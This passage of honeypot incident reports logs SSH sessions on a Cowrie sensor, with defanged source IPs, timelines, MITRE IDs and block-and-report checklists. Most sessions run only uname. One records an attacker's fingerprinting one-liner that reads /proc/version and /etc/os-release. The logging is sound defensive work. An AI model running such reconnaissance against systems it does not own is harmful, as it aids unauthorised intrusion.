| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:04` | `cowrie.session.connect` |
| `2026-08-23 12:52:04` | `cowrie.client.version` |
| `2026-08-23 12:52:04` | `cowrie.client.kex` |
| `2026-08-23 12:52:04` | `cowrie.login.success` |
| `2026-08-23 12:52:05` | `cowrie.session.params` |
| `2026-08-23 12:52:05` | `cowrie.command.input` |
| `2026-08-23 12:52:05` | `cowrie.log.closed` |
| `2026-08-23 12:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6018612d9ec5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:09` | `cowrie.session.connect` |
| `2026-08-23 12:52:09` | `cowrie.client.version` |
| `2026-08-23 12:52:09` | `cowrie.client.kex` |
| `2026-08-23 12:52:09` | `cowrie.login.success` |
| `2026-08-23 12:52:10` | `cowrie.session.params` |
| `2026-08-23 12:52:10` | `cowrie.command.input` |
| `2026-08-23 12:52:10` | `cowrie.log.closed` |
| `2026-08-23 12:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fd5ae24d28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:14` | `cowrie.session.connect` |
| `2026-08-23 12:52:14` | `cowrie.client.version` |
| `2026-08-23 12:52:14` | `cowrie.client.kex` |
| `2026-08-23 12:52:15` | `cowrie.login.success` |
| `2026-08-23 12:52:15` | `cowrie.session.params` |
| `2026-08-23 12:52:15` | `cowrie.command.input` |
| `2026-08-23 12:52:16` | `cowrie.log.closed` |
| `2026-08-23 12:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4df5f9f58949

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:19` | `cowrie.session.connect` |
| `2026-08-23 12:52:19` | `cowrie.client.version` |
| `2026-08-23 12:52:19` | `cowrie.client.kex` |
| `2026-08-23 12:52:20` | `cowrie.login.success` |
| `2026-08-23 12:52:21` | `cowrie.session.params` |
| `2026-08-23 12:52:21` | `cowrie.command.input` |
| `2026-08-23 12:52:21` | `cowrie.log.closed` |
| `2026-08-23 12:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e5544bc2e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:24` | `cowrie.session.connect` |
| `2026-08-23 12:52:24` | `cowrie.client.version` |
| `2026-08-23 12:52:25` | `cowrie.client.kex` |
| `2026-08-23 12:52:25` | `cowrie.login.success` |
| `2026-08-23 12:52:26` | `cowrie.session.params` |
| `2026-08-23 12:52:26` | `cowrie.command.input` |
| `2026-08-23 12:52:26` | `cowrie.log.closed` |
| `2026-08-23 12:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7628bb2129df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:30` | `cowrie.session.connect` |
| `2026-08-23 12:52:30` | `cowrie.client.version` |
| `2026-08-23 12:52:30` | `cowrie.client.kex` |
| `2026-08-23 12:52:30` | `cowrie.login.success` |
| `2026-08-23 12:52:31` | `cowrie.session.params` |
| `2026-08-23 12:52:31` | `cowrie.command.input` |
| `2026-08-23 12:52:31` | `cowrie.log.closed` |
| `2026-08-23 12:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc68b7b36e92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:35` | `cowrie.session.connect` |
| `2026-08-23 12:52:35` | `cowrie.client.version` |
| `2026-08-23 12:52:35` | `cowrie.client.kex` |
| `2026-08-23 12:52:35` | `cowrie.login.success` |
| `2026-08-23 12:52:36` | `cowrie.session.params` |
| `2026-08-23 12:52:36` | `cowrie.command.input` |
| `2026-08-23 12:52:36` | `cowrie.log.closed` |
| `2026-08-23 12:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd601f318eb9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:40` | `cowrie.session.connect` |
| `2026-08-23 12:52:40` | `cowrie.client.version` |
| `2026-08-23 12:52:40` | `cowrie.client.kex` |
| `2026-08-23 12:52:40` | `cowrie.login.success` |
| `2026-08-23 12:52:41` | `cowrie.session.params` |
| `2026-08-23 12:52:41` | `cowrie.command.input` |
| `2026-08-23 12:52:41` | `cowrie.log.closed` |
| `2026-08-23 12:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c739b6cf5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:45` | `cowrie.session.connect` |
| `2026-08-23 12:52:45` | `cowrie.client.version` |
| `2026-08-23 12:52:45` | `cowrie.client.kex` |
| `2026-08-23 12:52:45` | `cowrie.login.success` |
| `2026-08-23 12:52:46` | `cowrie.session.params` |
| `2026-08-23 12:52:46` | `cowrie.command.input` |
| `2026-08-23 12:52:46` | `cowrie.log.closed` |
| `2026-08-23 12:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6402a08df3b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:50` | `cowrie.session.connect` |
| `2026-08-23 12:52:50` | `cowrie.client.version` |
| `2026-08-23 12:52:50` | `cowrie.client.kex` |
| `2026-08-23 12:52:51` | `cowrie.login.success` |
| `2026-08-23 12:52:51` | `cowrie.session.params` |
| `2026-08-23 12:52:51` | `cowrie.command.input` |
| `2026-08-23 12:52:51` | `cowrie.log.closed` |
| `2026-08-23 12:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad8d183de9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:52 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:52:55` | `cowrie.session.connect` |
| `2026-08-23 12:52:55` | `cowrie.client.version` |
| `2026-08-23 12:52:55` | `cowrie.client.kex` |
| `2026-08-23 12:52:56` | `cowrie.login.success` |
| `2026-08-23 12:52:57` | `cowrie.session.params` |
| `2026-08-23 12:52:57` | `cowrie.command.input` |
| `2026-08-23 12:52:57` | `cowrie.log.closed` |
| `2026-08-23 12:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae219fa23961

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:00` | `cowrie.session.connect` |
| `2026-08-23 12:53:00` | `cowrie.client.version` |
| `2026-08-23 12:53:00` | `cowrie.client.kex` |
| `2026-08-23 12:53:01` | `cowrie.login.success` |
| `2026-08-23 12:53:02` | `cowrie.session.params` |
| `2026-08-23 12:53:02` | `cowrie.command.input` |
| `2026-08-23 12:53:02` | `cowrie.log.closed` |
| `2026-08-23 12:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b63f161c40c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:06` | `cowrie.session.connect` |
| `2026-08-23 12:53:06` | `cowrie.client.version` |
| `2026-08-23 12:53:06` | `cowrie.client.kex` |
| `2026-08-23 12:53:06` | `cowrie.login.success` |
| `2026-08-23 12:53:07` | `cowrie.session.params` |
| `2026-08-23 12:53:07` | `cowrie.command.input` |
| `2026-08-23 12:53:07` | `cowrie.log.closed` |
| `2026-08-23 12:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9eba507739

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:11` | `cowrie.session.connect` |
| `2026-08-23 12:53:11` | `cowrie.client.version` |
| `2026-08-23 12:53:11` | `cowrie.client.kex` |
| `2026-08-23 12:53:12` | `cowrie.login.success` |
| `2026-08-23 12:53:13` | `cowrie.session.params` |
| `2026-08-23 12:53:13` | `cowrie.command.input` |
| `2026-08-23 12:53:13` | `cowrie.log.closed` |
| `2026-08-23 12:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46a4a43a867

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:16` | `cowrie.session.connect` |
| `2026-08-23 12:53:16` | `cowrie.client.version` |
| `2026-08-23 12:53:16` | `cowrie.client.kex` |
| `2026-08-23 12:53:17` | `cowrie.login.success` |
| `2026-08-23 12:53:18` | `cowrie.session.params` |
| `2026-08-23 12:53:18` | `cowrie.command.input` |
| `2026-08-23 12:53:18` | `cowrie.log.closed` |
| `2026-08-23 12:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811a98a074be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:21` | `cowrie.session.connect` |
| `2026-08-23 12:53:21` | `cowrie.client.version` |
| `2026-08-23 12:53:22` | `cowrie.client.kex` |
| `2026-08-23 12:53:22` | `cowrie.login.success` |
| `2026-08-23 12:53:23` | `cowrie.session.params` |
| `2026-08-23 12:53:23` | `cowrie.command.input` |
| `2026-08-23 12:53:23` | `cowrie.log.closed` |
| `2026-08-23 12:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7802b7974b91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:27` | `cowrie.session.connect` |
| `2026-08-23 12:53:27` | `cowrie.client.version` |
| `2026-08-23 12:53:27` | `cowrie.client.kex` |
| `2026-08-23 12:53:27` | `cowrie.login.success` |
| `2026-08-23 12:53:28` | `cowrie.session.params` |
| `2026-08-23 12:53:28` | `cowrie.command.input` |
| `2026-08-23 12:53:28` | `cowrie.log.closed` |
| `2026-08-23 12:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd189dc6799

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:32` | `cowrie.session.connect` |
| `2026-08-23 12:53:32` | `cowrie.client.version` |
| `2026-08-23 12:53:32` | `cowrie.client.kex` |
| `2026-08-23 12:53:32` | `cowrie.login.success` |
| `2026-08-23 12:53:33` | `cowrie.session.params` |
| `2026-08-23 12:53:33` | `cowrie.command.input` |
| `2026-08-23 12:53:33` | `cowrie.log.closed` |
| `2026-08-23 12:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d58d17731b65

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:37` | `cowrie.session.connect` |
| `2026-08-23 12:53:37` | `cowrie.client.version` |
| `2026-08-23 12:53:37` | `cowrie.client.kex` |
| `2026-08-23 12:53:38` | `cowrie.login.success` |
| `2026-08-23 12:53:39` | `cowrie.session.params` |
| `2026-08-23 12:53:39` | `cowrie.command.input` |
| `2026-08-23 12:53:39` | `cowrie.log.closed` |
| `2026-08-23 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ad090f8f58

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:41` | `cowrie.session.connect` |
| `2026-08-23 12:53:41` | `cowrie.client.version` |
| `2026-08-23 12:53:41` | `cowrie.client.kex` |
| `2026-08-23 12:53:41` | `cowrie.login.success` |
| `2026-08-23 12:53:43` | `cowrie.session.params` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.success` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.command.input` |
| `2026-08-23 12:53:43` | `cowrie.log.closed` |
| `2026-08-23 12:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b22a1dfc4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:43` | `cowrie.session.connect` |
| `2026-08-23 12:53:43` | `cowrie.client.version` |
| `2026-08-23 12:53:43` | `cowrie.client.kex` |
| `2026-08-23 12:53:43` | `cowrie.login.success` |
| `2026-08-23 12:53:44` | `cowrie.session.params` |
| `2026-08-23 12:53:44` | `cowrie.command.input` |
| `2026-08-23 12:53:44` | `cowrie.log.closed` |
| `2026-08-23 12:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05553a205d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:48` | `cowrie.session.connect` |
| `2026-08-23 12:53:48` | `cowrie.client.version` |
| `2026-08-23 12:53:48` | `cowrie.client.kex` |
| `2026-08-23 12:53:48` | `cowrie.login.success` |
| `2026-08-23 12:53:49` | `cowrie.session.params` |
| `2026-08-23 12:53:49` | `cowrie.command.input` |
| `2026-08-23 12:53:49` | `cowrie.log.closed` |
| `2026-08-23 12:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259a476c5e0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:53` | `cowrie.session.connect` |
| `2026-08-23 12:53:53` | `cowrie.client.version` |
| `2026-08-23 12:53:53` | `cowrie.client.kex` |
| `2026-08-23 12:53:53` | `cowrie.login.success` |
| `2026-08-23 12:53:54` | `cowrie.session.params` |
| `2026-08-23 12:53:54` | `cowrie.command.input` |
| `2026-08-23 12:53:54` | `cowrie.log.closed` |
| `2026-08-23 12:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bc3c6bb5b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:53 |
| **Last Seen** | 2026-08-23 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:53:58` | `cowrie.session.connect` |
| `2026-08-23 12:53:58` | `cowrie.client.version` |
| `2026-08-23 12:53:58` | `cowrie.client.kex` |
| `2026-08-23 12:53:59` | `cowrie.login.success` |
| `2026-08-23 12:53:59` | `cowrie.session.params` |
| `2026-08-23 12:53:59` | `cowrie.command.input` |
| `2026-08-23 12:53:59` | `cowrie.log.closed` |
| `2026-08-23 12:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ab20dd4593

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:03` | `cowrie.session.connect` |
| `2026-08-23 12:54:03` | `cowrie.client.version` |
| `2026-08-23 12:54:03` | `cowrie.client.kex` |
| `2026-08-23 12:54:04` | `cowrie.login.success` |
| `2026-08-23 12:54:05` | `cowrie.session.params` |
